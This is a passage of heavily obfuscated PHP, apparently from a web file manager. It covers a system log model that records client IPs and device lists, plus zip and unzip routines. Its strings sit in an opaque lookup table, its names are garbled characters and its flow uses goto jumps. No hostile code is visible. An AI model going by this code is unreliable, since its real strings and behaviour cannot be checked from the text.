Model($èÒÒÒˆü[877])->removeNow($©şÑ‘Ì, !1); } } private function removeShareItems($Ã‡¥Õ®å) { $ÎŒÀÈŒ =& $_SERVER[Ñ¯©ç]; $û±Û’¯ş = "\x7b\x69\x6f\72{$Ã‡¥Õ®å}\175\x2f"; $¹ˆÕ§‰Ñ = array($ÎŒÀÈŒ[194] => 0, $ÎŒÀÈŒ[1232] => array($ÎŒÀÈŒ[442], "{$û±Û’¯ş}\45")); $æ«”ûÕ¶ = Model($ÎŒÀÈŒ[1935])->where($¹ˆÕ§‰Ñ)->field($ÎŒÀÈŒ[648])->select(); if (empty($æ«”ûÕ¶)) { return; } $€×¦ƒã = array_to_keyvalue($æ«”ûÕ¶, $ÎŒÀÈŒ[12], $ÎŒÀÈŒ[648]); Model($ÎŒÀÈŒ[647])->remove($€×¦ƒã); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\x4c\x69\147\150\x74\x41\160\x70"; public $modelType = "\x53\171\163\164\x65\x6d\x4f\160\x74\151\157\156"; public $field = array("\x6e\x61\155\x65", "\147\162\x6f\x75\160", "\144\145\163\143", "\143\157\156\164\145\156\164"); public function listData($êÆáÁ¤ç = false, $ºÇöõ¤ = "\155\x6f\144\x69\146\x79\x54\x69\155\145", $ˆØÅçÆû = true) { return parent::listData($êÆáÁ¤ç, $ºÇöõ¤, $ˆØÅçÆû); } public function remove($ä„®‚Şú) { $‚®Èş = $this->findByName($ä„®‚Şú); if (!$‚®Èş) { return !1; } return parent::remove($‚®Èş[$_SERVER[Ñ¯©ç][458]]); } public function add($ä²õÚªä) { if ($this->findByName($ä²õÚªä[$_SERVER[Ñ¯©ç][32]])) { return !1; } return parent::insert($ä²õÚªä); } public function update($ˆºÍÎÈğ, $«­¦à«‹) { $úôÚ¨Î =& $_SERVER[Ñ¯©ç]; $¶ç˜¨éÎ = $this->findByName($ˆºÍÎÈğ); $¨úÉ”Æ = $this->findByName($«­¦à«‹[$úôÚ¨Î[32]]); if (!$¶ç˜¨éÎ || $¨úÉ”Æ && $¨úÉ”Æ[$úôÚ¨Î[458]] != $¶ç˜¨éÎ[$úôÚ¨Î[458]]) { return !1; } return parent::update($¶ç˜¨éÎ[$úôÚ¨Î[458]], $«­¦à«‹); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\151\155\145", "\164\151\x6d\145", "\x69\x6e\x73\145\x72\x74", "\146\165\156\x63\164\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¼³ëÀÇò =& $_SERVER[Ñ¯©ç]; return array($¼³ëÀÇò[2312] => LNG($¼³ëÀÇò[2313]), $¼³ëÀÇò[2314] => LNG($¼³ëÀÇò[2315]), $¼³ëÀÇò[1898] => LNG($¼³ëÀÇò[2316]), $¼³ëÀÇò[2317] => LNG($¼³ëÀÇò[2318]), $¼³ëÀÇò[2319] => LNG($¼³ëÀÇò[2320]), $¼³ëÀÇò[2321] => LNG($¼³ëÀÇò[2322]), $¼³ëÀÇò[2323] => LNG($¼³ëÀÇò[2324]), $¼³ëÀÇò[1928] => LNG($¼³ëÀÇò[2324]), $¼³ëÀÇò[1929] => LNG($¼³ëÀÇò[2325]), $¼³ëÀÇò[2326] => LNG($¼³ëÀÇò[2327]), $¼³ëÀÇò[2328] => LNG($¼³ëÀÇò[2329]), $¼³ëÀÇò[2330] => LNG($¼³ëÀÇò[2331]), $¼³ëÀÇò[2332] => LNG($¼³ëÀÇò[2333]), $¼³ëÀÇò[1926] => LNG($¼³ëÀÇò[2334]), $¼³ëÀÇò[2335] => LNG($¼³ëÀÇò[2336]), $¼³ëÀÇò[1933] => LNG($¼³ëÀÇò[2337]), $¼³ëÀÇò[2338] => LNG($¼³ëÀÇò[2339]), $¼³ëÀÇò[2340] => LNG($¼³ëÀÇò[2341]), $¼³ëÀÇò[2342] => LNG($¼³ëÀÇò[2343]), $¼³ëÀÇò[2344] => LNG($¼³ëÀÇò[2345]), $¼³ëÀÇò[1936] => LNG($¼³ëÀÇò[2346]), $¼³ëÀÇò[1937] => LNG($¼³ëÀÇò[2347]), $¼³ëÀÇò[2348] => LNG($¼³ëÀÇò[2349]), $¼³ëÀÇò[2350] => LNG($¼³ëÀÇò[2351]), $¼³ëÀÇò[2352] => LNG($¼³ëÀÇò[2353]), $¼³ëÀÇò[1931] => LNG($¼³ëÀÇò[2354]), $¼³ëÀÇò[2355] => LNG($¼³ëÀÇò[2356]), $¼³ëÀÇò[1930] => LNG($¼³ëÀÇò[2357]), $¼³ëÀÇò[2358] => LNG($¼³ëÀÇò[2359]), $¼³ëÀÇò[2360] => LNG($¼³ëÀÇò[2361]), $¼³ëÀÇò[2362] => LNG($¼³ëÀÇò[2361]), $¼³ëÀÇò[2363] => LNG($¼³ëÀÇò[2364]), $¼³ëÀÇò[2365] => LNG($¼³ëÀÇò[2365]), $¼³ëÀÇò[2366] => LNG($¼³ëÀÇò[1902]), $¼³ëÀÇò[2367] => LNG($¼³ëÀÇò[2368]), $¼³ëÀÇò[2369] => LNG($¼³ëÀÇò[2370]), $¼³ëÀÇò[2371] => LNG($¼³ëÀÇò[2372]), $¼³ëÀÇò[2373] => LNG($¼³ëÀÇò[2374]), $¼³ëÀÇò[2375] => LNG($¼³ëÀÇò[2376]), $¼³ëÀÇò[2377] => LNG($¼³ëÀÇò[2377]), $¼³ëÀÇò[2378] => LNG($¼³ëÀÇò[2379]), $¼³ëÀÇò[2380] => LNG($¼³ëÀÇò[2381]), $¼³ëÀÇò[2382] => LNG($¼³ëÀÇò[2383]), $¼³ëÀÇò[2384] => LNG($¼³ëÀÇò[2385]), $¼³ëÀÇò[2386] => LNG($¼³ëÀÇò[2387]), $¼³ëÀÇò[2388] => LNG($¼³ëÀÇò[2389]), $¼³ëÀÇò[213] => LNG($¼³ëÀÇò[213]), $¼³ëÀÇò[214] => LNG($¼³ëÀÇò[2390]), $¼³ëÀÇò[2391] => LNG($¼³ëÀÇò[2391])); } private function typeFile() { $ŞÀ˜®§³ =& $_SERVER[Ñ¯©ç]; $†¦”Çè  = array($ŞÀ˜®§³[1933] => array($ŞÀ˜®§³[1934]), $ŞÀ˜®§³[2330] => array($ŞÀ˜®§³[2392]), $ŞÀ˜®§³[2332] => array($ŞÀ˜®§³[2393]), $ŞÀ˜®§³[1926] => array($ŞÀ˜®§³[1927], $ŞÀ˜®§³[2394]), $ŞÀ˜®§³[2340] => array(), $ŞÀ˜®§³[2342] => array(), $ŞÀ˜®§³[2344] => array(), $ŞÀ˜®§³[1936] => array($ŞÀ˜®§³[1938]), $ŞÀ˜®§³[1937] => array($ŞÀ˜®§³[1938]), $ŞÀ˜®§³[2348] => array($ŞÀ˜®§³[2395]), $ŞÀ˜®§³[2350] => array($ŞÀ˜®§³[2395]), $ŞÀ˜®§³[2352] => array($ŞÀ˜®§³[2396]), $ŞÀ˜®§³[2338] => array($ŞÀ˜®§³[2397]), $ŞÀ˜®§³[1931] => array($ŞÀ˜®§³[2398]), $ŞÀ˜®§³[2355] => array($ŞÀ˜®§³[2399]), $ŞÀ˜®§³[1930] => array($ŞÀ˜®§³[1932])); return $†¦”Çè ; } private function typeAll() { $üœ„Ø›“ =& $_SERVER[Ñ¯©ç]; $öÌ¾ëˆ = $this->typeList; $àÑ°ì± = array_filter($this->typeFile()); foreach ($àÑ°ì± as $³»ú…Ö => $ªÊ÷û¡¤) { $öÌ¾ëˆ[$ªÊ÷û¡¤[0]] = $öÌ¾ëˆ[$³»ú…Ö]; } $öÌ¾ëˆ[$üœ„Ø›“[1938]] = LNG($üœ„Ø›“[2400]); $öÌ¾ëˆ[$üœ„Ø›“[2395]] = LNG($üœ„Ø›“[2401]); return $öÌ¾ëˆ; } public function addLog($ˆö¥‘ˆ, $ı“Ÿ‚¥Ü = array()) { $¥æÊÀ¸¡ =& $_SERVER[Ñ¯©ç]; if (!isset($this->typeList[$ˆö¥‘ˆ])) { return; } $ñ¥š· = Session::get($¥æÊÀ¸¡[2093]); if (!$ñ¥š·) { $ñ¥š· = _get($ı“Ÿ‚¥Ü, $¥æÊÀ¸¡[1757], 0); } if ($ˆö¥‘ˆ == $¥æÊÀ¸¡[2367] && is_array($ı“Ÿ‚¥Ü[$¥æÊÀ¸¡[2402]]) && !$ı“Ÿ‚¥Ü[$¥æÊÀ¸¡[2402]]) { return; } $Àî«ğ²’ = get_client_ip(); if (!$ı“Ÿ‚¥Ü || strlen(json_encode($ı“Ÿ‚¥Ü)) >= 1024 * 64) { if ($ı“Ÿ‚¥Ü && is_array($ı“Ÿ‚¥Ü)) { $ı“Ÿ‚¥Ü = array_intersect_key($ı“Ÿ‚¥Ü, array_flip($¥æÊÀ¸¡[458], $¥æÊÀ¸¡[32])); $ı“Ÿ‚¥Ü[$¥æÊÀ¸¡[2403]] = $Àî«ğ²’; } else { $ı“Ÿ‚¥Ü = array($¥æÊÀ¸¡[2403] => $Àî«ğ²’); } } else { if (is_array($ı“Ÿ‚¥Ü)) { $ı“Ÿ‚¥Ü[$¥æÊÀ¸¡[2403]] = $Àî«ğ²’; } else { $ı“Ÿ‚¥Ü = array($¥æÊÀ¸¡[1259] => $ı“Ÿ‚¥Ü, $¥æÊÀ¸¡[2403] => $Àî«ğ²’); } } $ı“Ÿ‚¥Ü = array($¥æÊÀ¸¡[1747] => Session::sign(), $¥æÊÀ¸¡[1748] => intval($ñ¥š·), $¥æÊÀ¸¡[33] => $ˆö¥‘ˆ, $¥æÊÀ¸¡[1750] => json_encode($ı“Ÿ‚¥Ü)); parent::add($ı“Ÿ‚¥Ü); } public function remove($ü€’„æ¥) { $this->where(array($_SERVER[Ñ¯©ç][476] => $ü€’„æ¥))->delete(); } private function _makeOrder($’»¿öü¤ = '') { $¡ ¤Ë‹ =& $_SERVER[Ñ¯©ç]; $èÂëªÄ = $¡ ¤Ë‹[232]; $€é°ğ•Ã = array($¡ ¤Ë‹[506] => $¡ ¤Ë‹[507], $¡ ¤Ë‹[508] => $¡ ¤Ë‹[509]); $£äŸÅÅé = Input::get($¡ ¤Ë‹[514], $¡ ¤Ë‹[7], $¡ ¤Ë‹[2129], array($¡ ¤Ë‹[2047], $¡ ¤Ë‹[508])); $£äŸÅÅé = $€é°ğ•Ã[$£äŸÅÅé]; $’»¿öü¤ = $’»¿öü¤ . "{$èÂëªÄ}\x20{$£äŸÅÅé}"; return $this->order($’»¿öü¤); } public function get($ÆÁúì¼ = '') { $çü†‚Òâ =& $_SERVER[Ñ¯©ç]; if (!$ÆÁúì¼) { show_json(array()); } $…³ºÔÕÕ = array(); if ($ÆÁúì¼[$çü†‚Òâ[1757]]) { $…³ºÔÕÕ[$çü†‚Òâ[1757]] = $ÆÁúì¼[$çü†‚Òâ[1757]]; } if (isset($ÆÁúì¼[$çü†‚Òâ[813]])) { $Ğ¡ÛÜäí = $ÆÁúì¼[$çü†‚Òâ[813]]; $ºè¡ÑÂÖ = isset($ÆÁúì¼[$çü†‚Òâ[814]]) ? $ÆÁúì¼[$çü†‚Òâ[814]] : time(); $…³ºÔÕÕ[$çü†‚Òâ[232]] = array($çü†‚Òâ[393], array($Ğ¡ÛÜäí, $ºè¡ÑÂÖ)); } if ($ÆÁúì¼[$çü†‚Òâ[33]]) { $ì‰ŒÂ = explode($çü†‚Òâ[50], $ÆÁúì¼[$çü†‚Òâ[33]]); $«—£ó”ó = $this->typeFile(); $¯äšõ’ = array(); foreach ($ì‰ŒÂ as $±Åİëã) { $¯äšõ’[] = $±Åİëã; if (isset($«—£ó”ó[$±Åİëã])) { $¯äšõ’ = array_merge($¯äšõ’, $«—£ó”ó[$±Åİëã]); } } $¯äšõ’ = array_unique($¯äšõ’); if ($¯äšõ’) { $…³ºÔÕÕ[$çü†‚Òâ[33]] = array($çü†‚Òâ[7], $¯äšõ’); } } else { $…³ºÔÕÕ[$çü†‚Òâ[33]] = array($çü†‚Òâ[2404], $çü†‚Òâ[2405]); } if (!empty($ÆÁúì¼[$çü†‚Òâ[2403]])) { $…³ºÔÕÕ[$çü†‚Òâ[509]] = array($çü†‚Òâ[442], "\x25{$ÆÁúì¼[$çü†‚Òâ[2403]]}\x25"); } $Î¢ ½Ÿâ = $this->_makeOrder()->where($…³ºÔÕÕ)->selectPage(); if (empty($Î¢ ½Ÿâ[$çü†‚Òâ[429]])) { show_json(array(), !0, $Î¢ ½Ÿâ[$çü†‚Òâ[426]]); } $Î¢ ½Ÿâ[$çü†‚Òâ[429]] = $this->logList($Î¢ ½Ÿâ[$çü†‚Òâ[429]]); return $Î¢ ½Ÿâ; } private function ipAddress(&$ä“±Üö) { $Ëåš¨Ğè =& $_SERVER[Ñ¯©ç]; if (!empty($ä“±Üö[$Ëåš¨Ğè[2403]])) { $²®éË = IpLocation::get($ä“±Üö[$Ëåš¨Ğè[2403]]); } else { $²®éË = LNG($Ëåš¨Ğè[2406]); } $ä“±Üö[$Ëåš¨Ğè[2407]] = $²®éË; } private function descZipDownload($İ€™Ã½™, &$ÜÕÌÎıÄ) { $šãÈÁá¾ =& $_SERVER[Ñ¯©ç]; if (!isset($İ€™Ã½™[$šãÈÁá¾[2408]])) { return; } $ê’µÍ‰ = json_decode($İ€™Ã½™[$šãÈÁá¾[2408]], !0); foreach ($ê’µÍ‰ as $›åÓÍãÄ) { try { $¼›Ùú¼š = IO::infoFullSimple($›åÓÍãÄ[$šãÈÁá¾[97]]); } catch (Exception $ãÀàíó) { continue; } $İ€™Ã½™[$šãÈÁá¾[97]] = $›åÓÍãÄ[$šãÈÁá¾[97]]; $ÜÕÌÎıÄ[] = $İ€™Ã½™[$šãÈÁá¾[194]] = $¼›Ùú¼š[$šãÈÁá¾[194]]; $ÜÕÌÎıÄ[] = $İ€™Ã½™[$šãÈÁá¾[2185]] = $¼›Ùú¼š[$šãÈÁá¾[193]]; break; } return $İ€™Ã½™; } private function getSourceList(&$Ì‘Ÿ¡é) { $ŠßÏœ†¹ =& $_SERVER[Ñ¯©ç]; $îîİ“ì = array(); foreach ($Ì‘Ÿ¡é as $·¿ëŒ÷“ => $á–×±º­) { $¯î­é¥ = json_decode($á–×±º­[$ŠßÏœ†¹[509]], !0); if ($á–×±º­[$ŠßÏœ†¹[33]] == $ŠßÏœ†¹[1929]) { $¯î­é¥ = $this->descZipDownload($¯î­é¥, $îîİ“ì); $Ì‘Ÿ¡é[$·¿ëŒ÷“][$ŠßÏœ†¹[509]] = json_encode($¯î­é¥); continue; } if (strpos($á–×±º­[$ŠßÏœ†¹[33]], $ŠßÏœ†¹[2187]) !== 0) { if (!isset($¯î­é¥[$ŠßÏœ†¹[97]]) || strpos($á–×±º­[$ŠßÏœ†¹[33]], $ŠßÏœ†¹[2409]) !== 0) { continue; } try { $»Í¸—ÁÈ = IO::infoFullSimple($¯î­é¥[$ŠßÏœ†¹[97]]); } catch (Exception $Ò¹Ò½Ò¥) { continue; } $îîİ“ì[] = $¯î­é¥[$ŠßÏœ†¹[194]] = $»Í¸—ÁÈ[$ŠßÏœ†¹[194]]; $îîİ“ì[] = $¯î­é¥[$ŠßÏœ†¹[2185]] = $»Í¸—ÁÈ[$ŠßÏœ†¹[193]]; $Ì‘Ÿ¡é[$·¿ëŒ÷“][$ŠßÏœ†¹[509]] = json_encode($¯î­é¥); continue; } $îîİ“ì[] = $¯î­é¥[$ŠßÏœ†¹[194]]; $îîİ“ì[] = $¯î­é¥[$ŠßÏœ†¹[2185]]; if ($¯î­é¥[$ŠßÏœ†¹[33]] == $ŠßÏœ†¹[603]) { $îîİ“ì[] = $¯î­é¥[$ŠßÏœ†¹[509]][$ŠßÏœ†¹[1216]]; $îîİ“ì[] = $¯î­é¥[$ŠßÏœ†¹[509]][$ŠßÏœ†¹[1217]]; } if ($¯î­é¥[$ŠßÏœ†¹[33]] == $ŠßÏœ†¹[2196]) { $îîİ“ì[] = $¯î­é¥[$ŠßÏœ†¹[509]][$ŠßÏœ†¹[194]]; } } if (!$îîİ“ì) { return array(); } return Model($ŠßÏœ†¹[877])->sourceListInfo($îîİ“ì, !0); } private function logList($¿ù¾Ö½È) { $‹´ÇÑˆ½ =& $_SERVER[Ñ¯©ç]; $ÊõÎ¬”Å = array_to_keyvalue($¿ù¾Ö½È, $‹´ÇÑˆ½[12], $‹´ÇÑˆ½[1757]); $ ³ÁÓïÔ = Model($‹´ÇÑˆ½[582])->userListInfo(array_unique($ÊõÎ¬”Å)); $š‡·í‹ = $this->getSourceList($¿ù¾Ö½È); $§ÃÔ«Ò„ = $this->typeAll(); $ûÅ¯ã¶ = array(); $¥èƒßª = array(); foreach ($¿ù¾Ö½È as $€£”‰Æµ => $èà†ä·•) { $øâşè = $èà†ä·•[$‹´ÇÑˆ½[33]]; $›ºË‘ÊÑ = isset($ ³ÁÓïÔ[$èà†ä·•[$‹´ÇÑˆ½[1757]]]) ? $ ³ÁÓïÔ[$èà†ä·•[$‹´ÇÑˆ½[1757]]] : !1; $ßÜ³¤§Û = strpos($øâşè, $‹´ÇÑˆ½[2410]) === 0 ? LNG($‹´ÇÑˆ½[2411]) : LNG($‹´ÇÑˆ½[2406]); $èà†ä·•[$‹´ÇÑˆ½[32]] = isset($›ºË‘ÊÑ[$‹´ÇÑˆ½[32]]) ? $›ºË‘ÊÑ[$‹´ÇÑˆ½[32]] : LNG($‹´ÇÑˆ½[2406]); $èà†ä·•[$‹´ÇÑˆ½[2240]] = isset($›ºË‘ÊÑ[$‹´ÇÑˆ½[2240]]) ? $›ºË‘ÊÑ[$‹´ÇÑˆ½[2240]] : $‹´ÇÑˆ½[12]; $èà†ä·•[$‹´ÇÑˆ½[1647]] = isset($§ÃÔ«Ò„[$øâşè]) ? $§ÃÔ«Ò„[$øâşè] : $ßÜ³¤§Û; $èà†ä·•[$‹´ÇÑˆ½[2128]] = $›ºË‘ÊÑ; $ñÍ‚°ıó = json_decode($èà†ä·•[$‹´ÇÑˆ½[509]], !0); $èà†ä·•[$‹´ÇÑˆ½[2403]] = isset($ñÍ‚°ıó[$‹´ÇÑˆ½[2403]]) ? $ñÍ‚°ıó[$‹´ÇÑˆ½[2403]] : $‹´ÇÑˆ½[12]; $èà†ä·•[$‹´ÇÑˆ½[2407]] = IpLocation::get($èà†ä·•[$‹´ÇÑˆ½[2403]]); if (strpos($øâşè, $‹´ÇÑˆ½[2187]) === 0 || isset($ñÍ‚°ıó[$‹´ÇÑˆ½[2185]])) { $ñÍ‚°ıó[$‹´ÇÑˆ½[100]] = $š‡·í‹[$ñÍ‚°ıó[$‹´ÇÑˆ½[194]]]; $ñÍ‚°ıó[$‹´ÇÑˆ½[2201]] = $š‡·í‹[$ñÍ‚°ıó[$‹´ÇÑˆ½[2185]]]; if ($ñÍ‚°ıó[$‹´ÇÑˆ½[33]] == $‹´ÇÑˆ½[603]) { $ñÍ‚°ıó[$‹´ÇÑˆ½[509]][$‹´ÇÑˆ½[1216]] = $š‡·í‹[$ñÍ‚°ıó[$‹´ÇÑˆ½[509]][$‹´ÇÑˆ½[1216]]]; $ñÍ‚°ıó[$‹´ÇÑˆ½[509]][$‹´ÇÑˆ½[1217]] = $š‡·í‹[$ñÍ‚°ıó[$‹´ÇÑˆ½[509]][$‹´ÇÑˆ½[1217]]]; } if ($ñÍ‚°ıó[$‹´ÇÑˆ½[33]] == $‹´ÇÑˆ½[2196]) { $ñÍ‚°ıó[$‹´ÇÑˆ½[509]][$‹´ÇÑˆ½[194]] = $š‡·í‹[$ñÍ‚°ıó[$‹´ÇÑˆ½[509]][$‹´ÇÑˆ½[194]]]; } if ($ñÍ‚°ıó[$‹´ÇÑˆ½[33]] == $‹´ÇÑˆ½[1924]) { $ñÍ‚°ıó[$‹´ÇÑˆ½[2201]] = $ñÍ‚°ıó[$‹´ÇÑˆ½[100]]; $ñÍ‚°ıó[$‹´ÇÑˆ½[2185]] = $ñÍ‚°ıó[$‹´ÇÑˆ½[2201]][$‹´ÇÑˆ½[194]]; $ñÍ‚°ıó[$‹´ÇÑˆ½[100]] = !1; $ñÍ‚°ıó[$‹´ÇÑˆ½[194]] = $‹´ÇÑˆ½[12]; } else { if ($ñÍ‚°ıó[$‹´ÇÑˆ½[100]] && $ñÍ‚°ıó[$‹´ÇÑˆ½[100]][$‹´ÇÑˆ½[191]] == $‹´ÇÑˆ½[192]) { $¥èƒßª[] = $èà†ä·•[$‹´ÇÑˆ½[458]]; unset($¿ù¾Ö½È[$€£”‰Æµ]); continue; } if ($ñÍ‚°ıó[$‹´ÇÑˆ½[2201]] && $ñÍ‚°ıó[$‹´ÇÑˆ½[2201]][$‹´ÇÑˆ½[191]] == $‹´ÇÑˆ½[192]) { $¥èƒßª[] = $èà†ä·•[$‹´ÇÑˆ½[458]]; unset($¿ù¾Ö½È[$€£”‰Æµ]); continue; } } } $èà†ä·•[$‹´ÇÑˆ½[509]] = $ñÍ‚°ıó; unset($èà†ä·•[$‹´ÇÑˆ½[2412]]); $ûÅ¯ã¶[] = $èà†ä·•; } $this->clearSystemPathLog($¥èƒßª); return $ûÅ¯ã¶; } private function clearSystemPathLog($´²ıûÁØ) { $é¾‚±— =& $_SERVER[Ñ¯©ç]; if (count($´²ıûÁØ) == 0) { return; } $¤ºé£Ø€ = array($é¾‚±—[458] => array($é¾‚±—[7], array_unique($´²ıûÁØ))); $this->where($¤ºé£Ø€)->delete(); } public function deviceList($úúŸœÌ“, $û¯ûú¾³ = 0) { $Ù¦áÅÄ„ =& $_SERVER[Ñ¯©ç]; $Üéî—×ì = array($Ù¦áÅÄ„[1757] => $úúŸœÌ“, $Ù¦áÅÄ„[232] => array($Ù¦áÅÄ„[1067], $û¯ûú¾³), $Ù¦áÅÄ„[33] => $Ù¦áÅÄ„[1898]); $õ•†¤ÆÖ = array(); $ºóò…Ö = $this->field($Ù¦áÅÄ„[2413])->where($Üéî—×ì)->order($Ù¦áÅÄ„[2199])->limit(50)->select(); foreach ($ºóò…Ö as $†š£åƒ¶ => $Ù­õäË×) { if ($†š£åƒ¶ > 0 && abs($Ù­õäË×[$Ù¦áÅÄ„[232]] - $ºóò…Ö[$†š£åƒ¶ - 1][$Ù¦áÅÄ„[232]]) < 5) { continue; } $ŸÜÔ›ç´ = json_decode($Ù­õäË×[$Ù¦áÅÄ„[509]], !0); $Ù­õäË×[$Ù¦áÅÄ„[2403]] = isset($ŸÜÔ›ç´[$Ù¦áÅÄ„[2403]]) ? $ŸÜÔ›ç´[$Ù¦áÅÄ„[2403]] : $Ù¦áÅÄ„[12]; unset($ŸÜÔ›ç´[$Ù¦áÅÄ„[2403]]); $ÄæõËº = $this->deviceType($ŸÜÔ›ç´[$Ù¦áÅÄ„[2188]]); if (isset($õ•†¤ÆÖ[$ÄæõËº])) { continue; } $Ù­õäË×[$Ù¦áÅÄ„[2407]] = IpLocation::get($Ù­õäË×[$Ù¦áÅÄ„[2403]]); $Ù­õäË×[$Ù¦áÅÄ„[509]] = $ŸÜÔ›ç´; $õ•†¤ÆÖ[$ÄæõËº] = $Ù­õäË×; } return array_values($õ•†¤ÆÖ); } public function deviceType($ÆîˆÄÓ’) { return $ÆîˆÄÓ’; } } goto bğ„èÑ÷¥‘; F«‚é™®æ: define($_SERVER[Ñ¯©ç][301], 3); define($_SERVER[Ñ¯©ç][302], 1); define($_SERVER[Ñ¯©ç][303], 0); goto bÉ…ïĞ×Øà; c­ğÍÎÚ‡·: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ğ‘ÆóÊ«; if ($ğ‘ÆóÊ«) { return $ğ‘ÆóÊ«; } $İ´‘ãÓ‹ = IO::init($_SERVER[Ñ¯©ç][8]); return $İ´‘ãÓ‹; } private static function iconvSystem($¨òìè›ª) { return self::local()->iconvSystem($¨òìè›ª); } private static function iconvApp($»Ï˜Ë¢) { return self::local()->iconvApp($»Ï˜Ë¢); } public static function zipFolder($î‚ú‘Š¹, $Çî·›Ÿä = "\172\151\x70", $º¿éš¹Õ = '', $„ìó¸” = REPEAT_RENAME) { $Ò¼•ÆÒÄ =& $_SERVER[Ñ¯©ç]; $ÄÇÈÂ³û = IO::listPath($î‚ú‘Š¹); if (!$ÄÇÈÂ³û) { return !1; } $ÄÇÈÂ³û = array_merge($ÄÇÈÂ³û[$Ò¼•ÆÒÄ[95]], $ÄÇÈÂ³û[$Ò¼•ÆÒÄ[96]]); return self::zip($ÄÇÈÂ³û, $Çî·›Ÿä, $º¿éš¹Õ, $„ìó¸”); } public static function zip($îâÙÓô´, $ë¥šæÕ¼ = "\x7a\151\x70", $‡õÁ®Äˆ = '', $‚íıœ³½ = REPEAT_RENAME) { $éÍÏÂƒÜ =& $_SERVER[Ñ¯©ç]; if (is_string($îâÙÓô´) && $îâÙÓô´) { $îâÙÓô´ = array(array($éÍÏÂƒÜ[97] => $îâÙÓô´)); } $¹’¥ÔÎ = self::init($îâÙÓô´[0][$éÍÏÂƒÜ[97]]); $ú¬åë™Ş = self::info($îâÙÓô´[0][$éÍÏÂƒÜ[97]]); $÷Ñî«Ÿã = $éÍÏÂƒÜ[12]; $Ë×öÇÌ = $éÍÏÂƒÜ[12]; $  ”úˆÅ = $éÍÏÂƒÜ[12]; if ($‡õÁ®Äˆ && substr($‡õÁ®Äˆ, -1, 1) != $éÍÏÂƒÜ[8]) { $Ë×öÇÌ = get_path_father($‡õÁ®Äˆ); $  ”úˆÅ = get_path_this($‡õÁ®Äˆ); } else { $Ë×öÇÌ = self::pathFather($ú¬åë™Ş[$éÍÏÂƒÜ[97]]); $  ”úˆÅ = $ú¬åë™Ş[$éÍÏÂƒÜ[32]] . $éÍÏÂƒÜ[10] . $ë¥šæÕ¼; if (count($îâÙÓô´) > 1) { $‘¸©³É‰ = IO::info($Ë×öÇÌ); $  ”úˆÅ = $‘¸©³É‰[$éÍÏÂƒÜ[32]] . $éÍÏÂƒÜ[10] . $ë¥šæÕ¼; } if ($‡õÁ®Äˆ) { $Ë×öÇÌ = $‡õÁ®Äˆ; } } if ($¹’¥ÔÎ->getType() == $éÍÏÂƒÜ[119]) { $ó®£Ë²ã = self::init($Ë×öÇÌ); $—úöÏàƒ = $ó®£Ë²ã->getType() == $éÍÏÂƒÜ[119] ? $Ë×öÇÌ : get_path_father($¹’¥ÔÎ->path); $—úöÏàƒ = rtrim($—úöÏàƒ, $éÍÏÂƒÜ[8]) . $éÍÏÂƒÜ[8]; mk_dir($—úöÏàƒ); } else { $÷Ñî«Ÿã = TEMP_FILES . $éÍÏÂƒÜ[1240] . time() . rand_string(8) . $éÍÏÂƒÜ[8]; mk_dir($÷Ñî«Ÿã); file_put_contents($÷Ñî«Ÿã . $éÍÏÂƒÜ[1241], $éÍÏÂƒÜ[12]); $—úöÏàƒ = $÷Ñî«Ÿã; } $è·š”ìê = IO::info($—úöÏàƒ); if (!$è·š”ìê || !$è·š”ìê[$éÍÏÂƒÜ[234]]) { show_json(LNG($éÍÏÂƒÜ[1242]), !1); } $´Ñ½¶Öš = self::zipFileList($îâÙÓô´, $÷Ñî«Ÿã); foreach ($´Ñ½¶Öš as $ÕËÇßô => $å°¢¹­ì) { $´Ñ½¶Öš[$ÕËÇßô] = self::iconvSystem($å°¢¹­ì); } $ş¢ó”àÅ = get_filename_auto($—úöÏàƒ . $  ”úˆÅ, $éÍÏÂƒÜ[12], $‚íıœ³½); KodArchive::create(self::iconvSystem($ş¢ó”àÅ), $´Ñ½¶Öš); if (!IO::exist($ş¢ó”àÅ)) { if ($÷Ñî«Ÿã) { del_dir($÷Ñî«Ÿã); } show_json(LNG($éÍÏÂƒÜ[1243]), !1); } if (!$÷Ñî«Ÿã) { return $ş¢ó”àÅ; } $³Óì¹Æ = self::move($ş¢ó”àÅ, $Ë×öÇÌ, $‚íıœ³½); if ($÷Ñî«Ÿã) { del_dir($÷Ñî«Ÿã); } if (!$ş¢ó”àÅ) { show_json(LNG($éÍÏÂƒÜ[1243]), !1); } return $³Óì¹Æ; } public static function unzip($÷óó«®ï, $µ›„ë», $†ùÇ·Èû = "\55\x31", $³Á‹­Ÿà = "\x72\145\x70\x6c\x61\143\x65") { $ßÉ¼ñÊ =& $_SERVER[Ñ¯©ç]; $‰õ—Å§ = parent::info($÷óó«®ï); if (!$‰õ—Å§) { show_json(LNG($ßÉ¼ñÊ[1244]), !1); } $äÉ²‹˜ = IO::infoFullSimple($µ›„ë»); if (!$äÉ²‹˜) { $µ›„ë» = IO::mkdir($µ›„ë»); } if (isset($äÉ²‹˜[$ßÉ¼ñÊ[194]]) && trim($äÉ²‹˜[$ßÉ¼ñÊ[97]], $ßÉ¼ñÊ[8]) != trim($µ›„ë», $ßÉ¼ñÊ[8])) { $‰èÍ®Ğ = KodIO::make($äÉ²‹˜[$ßÉ¼ñÊ[193]]); $ûê‰¶ÕÈ = IO::fileNameAuto($‰èÍ®Ğ, $äÉ²‹˜[$ßÉ¼ñÊ[32]], REPEAT_RENAME_FOLDER, !0); $µ›„ë» = IO::mkdir($‰èÍ®Ğ . $ûê‰¶ÕÈ); } $†ùÇ·Èû = $†ùÇ·Èû && $†ùÇ·Èû != $ßÉ¼ñÊ[1245] ? @json_decode($†ùÇ·Èû, !0) : -1; $÷ÊÇ¬™ = self::unzipPart($÷óó«®ï, $†ùÇ·Èû); if (!$÷ÊÇ¬™ || !IO::exist($÷ÊÇ¬™[$ßÉ¼ñÊ[231]])) { show_json(LNG($ßÉ¼ñÊ[118]), !1); } $ºÎï±–ñ = $÷ÊÇ¬™[$ßÉ¼ñÊ[1246]][count($÷ÊÇ¬™[$ßÉ¼ñÊ[1246]]) - 1]; if ($ºÎï±–ñ[$ßÉ¼ñÊ[1247]] == -1 || 